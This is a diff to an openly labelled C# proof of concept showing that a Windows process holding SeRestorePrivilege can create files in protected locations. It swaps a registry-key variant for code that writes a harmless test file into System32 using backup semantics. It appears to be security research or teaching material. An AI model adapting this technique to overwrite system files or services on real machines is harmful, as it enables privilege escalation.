@@ -12,6 +12,117 @@ namespace SeRestorePrivilegePoC
          * P/Invoke : Enums
          */
         [Flags]
+        enum EFileAccess : uint
+        {
+            AccessSystemSecurity = 0x1000000,
+            MaximumAllowed = 0x2000000,
+
+            Delete = 0x10000,
+            ReadControl = 0x20000,
+            WriteDAC = 0x40000,
+            WriteOwner = 0x80000,
+            Synchronize = 0x100000,
+
+            StandardRightsRequired = 0xF0000,
+            StandardRightsRead = ReadControl,
+            StandardRightsWrite = ReadControl,
+            StandardRightsExecute = ReadControl,
+            StandardRightsAll = 0x1F0000,
+            SpecificRightsAll = 0xFFFF,
+
+            FILE_READ_DATA = 0x0001,
+            FILE_LIST_DIRECTORY = 0x0001,
+            FILE_WRITE_DATA = 0x0002,
+            FILE_ADD_FILE = 0x0002,
+            FILE_APPEND_DATA = 0x0004,
+            FILE_ADD_SUBDIRECTORY = 0x0004,
+            FILE_CREATE_PIPE_INSTANCE = 0x0004,
+            FILE_READ_EA = 0x0008,
+            FILE_WRITE_EA = 0x0010,
+            FILE_EXECUTE = 0x0020,
+            FILE_TRAVERSE = 0x0020,
+            FILE_DELETE_CHILD = 0x0040,
+            FILE_READ_ATTRIBUTES = 0x0080,
+            FILE_WRITE_ATTRIBUTES = 0x0100,
+
+            GenericRead = 0x80000000,
+            GenericWrite = 0x40000000,
+            GenericExecute = 0x20000000,
+            GenericAll = 0x10000000,
+            SPECIFIC_RIGHTS_ALL = 0x00FFFF,
+            FILE_ALL_ACCESS =
+                StandardRightsRequired |
+                Synchronize |
+                0x1FF,
+            FILE_GENERIC_READ =
+                StandardRightsRead |
+                FILE_READ_DATA |
+                FILE_READ_ATTRIBUTES |
+                FILE_READ_EA |
+                Synchronize,
+            FILE_GENERIC_WRITE =
+                StandardRightsWrite |
+                FILE_WRITE_DATA |
+                FILE_WRITE_ATTRIBUTES |
+                FILE_WRITE_EA |
+                FILE_APPEND_DATA |
+                Synchronize,
+            FILE_GENERIC_EXECUTE =
+                StandardRightsExecute |
+                FILE_READ_ATTRIBUTES |
+                FILE_EXECUTE |
+                Synchronize
+        }
+
+        [Flags]
+        enum EFileShare : uint
+        {
+            None = 0x00000000,
+            Read = 0x00000001,
+            Write = 0x00000002,
+            Delete = 0x00000004
+        }
+
+        enum ECreationDisposition : uint
+        {
+            New = 1,
+            CreateAlways = 2,
+            OpenExisting = 3,
+            OpenAlways = 4,
+            TruncateExisting = 5
+        }
+
+        [Flags]
+        enum EFileAttributes : uint
+        {
+            Readonly = 0x00000001,
+            Hidden = 0x00000002,
+            System = 0x00000004,
+            Directory = 0x00000010,
+            Archive = 0x00000020,
+            Device = 0x00000040,
+            Normal = 0x00000080,
+            Temporary = 0x00000100,
+            SparseFile = 0x00000200,
+            ReparsePoint = 0x00000400,
+            Compressed = 0x00000800,
+            Offline = 0x00001000,
+            NotContentIndexed = 0x00002000,
+            Encrypted = 0x00004000,
+            Write_Through = 0x80000000,
+            Overlapped = 0x40000000,
+            NoBuffering = 0x20000000,
+            RandomAccess = 0x10000000,
+            SequentialScan = 0x08000000,
+            DeleteOnClose = 0x04000000,
+            BackupSemantics = 0x02000000,
+            PosixSemantics = 0x01000000,
+            OpenReparsePoint = 0x00200000,
+            OpenNoRecall = 0x00100000,
+            FirstPipeInstance = 0x00080000
+        }
+
+        [Flags]
         enum FormatMessageFlags : uint
         {
             FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
@@ -25,17 +136,15 @@ namespace SeRestorePrivilegePoC
         /*
          * P/Invoke : Windows APIs
          */
-        [DllImport("advapi32.dll", SetLastError = false)]
-        static extern int RegCreateKeyEx(
-            UIntPtr hKey,
-            string lpSubKey,
-            IntPtr Reserved,
-            IntPtr lpClass,
-            uint dwOptions,
-            uint samDesired,
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern IntPtr CreateFile(
+            string lpFileName,
+            EFileAccess dwDesiredAccess,
+            EFileShare dwShareMode,
             IntPtr lpSecurityAttributes,
-            out IntPtr phkResult,
-            IntPtr lpdwDisposition);
+            ECreationDisposition dwCreationDisposition,
+            EFileAttributes dwFlagsAndAttributes,
+            IntPtr hTemplateFile);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool CloseHandle(IntPtr hObject);
@@ -49,6 +158,14 @@ namespace SeRestorePrivilegePoC
             StringBuilder lpBuffer,
             int nSize,
             IntPtr Arguments);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool WriteFile(
+            IntPtr hFile,
+            IntPtr lpBuffer,
+            int nNumberOfBytesToWrite,
+            IntPtr lpNumberOfBytesWritten,
+            IntPtr lpOverlapped);
 
         /*
          * Windows Consts
@@ -117,45 +234,64 @@ namespace SeRestorePrivilegePoC
         }
 
 
-        static IntPtr PrivilegedRegKeyOperation(string regKeyName)
+        static bool CreateTestFileWithRestorePrivilege(string filePath)
         {
-            Console.WriteLine("[*] If you have SeRestorePrivilege, you can get handle to sensitive files and registries with REG_OPTION_BACKUP_RESTORE flag.");
-            Console.WriteLine("[>] Trying to get handle to HKLM:\\{0}.", regKeyName);
+            int error;
+            bool status;
+            byte[] messageBytes = Encoding.UTF8.GetBytes("This file is created for testing SeRestorePrivilege.");
+            IntPtr buffer = Marshal.AllocHGlobal(messageBytes.Length);
+            Marshal.Copy(messageBytes, 0, buffer, messageBytes.Length);
 
-            int ntstatus = RegCreateKeyEx(
-                HKEY_LOCAL_MACHINE,
-                regKeyName,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                REG_OPTION_BACKUP_RESTORE,
-                KEY_SET_VALUE,
-                IntPtr.Zero,
-                out IntPtr phkResult,
-                IntPtr.Zero);
+            IntPtr hFile = CreateFile(
+               filePath,
+               EFileAccess.GenericRead | EFileAccess.GenericWrite,
+               EFileShare.None,
+               IntPtr.Zero,
+               ECreationDisposition.CreateAlways,
+               EFileAttributes.BackupSemantics,
+               IntPtr.Zero);
 
-            if (ntstatus != STATUS_SUCCESS)
+            if (hFile == IntPtr.Zero)
             {
-                Console.WriteLine("[-] Failed to get handle to HKLM:\\{0}.", regKeyName);
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
-                return IntPtr.Zero;
+                error = Marshal.GetLastWin32Error();
+                Console.WriteLine("[-] Failed to create {0}.", filePath);
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                Marshal.FreeHGlobal(buffer);
+
+                return false;
             }
 
-            return phkResult;
+            status = WriteFile(
+                hFile,
+                buffer,
+                messageBytes.Length,
+                IntPtr.Zero,
+                IntPtr.Zero);
+            Marshal.FreeHGlobal(buffer);
+            CloseHandle(hFile);
+
+            if (!status)
+            {
+                error = Marshal.GetLastWin32Error();
+                Console.WriteLine("[-] Failed to write content to {0}.", filePath);
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
+                return false;
+            }
+
+            Console.WriteLine("[+] {0} is created successfully.", filePath);
+
+            return true;
         }
+
 
         static void Main()
         {
-            string regKeyName = "SYSTEM\\CurrentControlSet\\Services\\dmwappushservice\\Parameters";
-            IntPtr phkResult = PrivilegedRegKeyOperation(regKeyName);
+            string filePath = @"C:\Windows\System32\SeRestorePrivilegeTestFile.txt";
+            Console.WriteLine("[*] If you have SeRestorePrivilege, you can write privileged files and registries in the system.");
+            Console.WriteLine("[*] This PoC tries to create file to {0}.", filePath);
 
-            if (phkResult != IntPtr.Zero)
-            {
-                Console.WriteLine("[+] Got handle to HKLM:\\{0} (hFile = 0x{1}).", regKeyName, phkResult.ToString("X"));
-                Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
-                Console.ReadLine();
-
-                CloseHandle(phkResult);
-            }
+            CreateTestFileWithRestorePrivilege(filePath);
         }
     }
 }
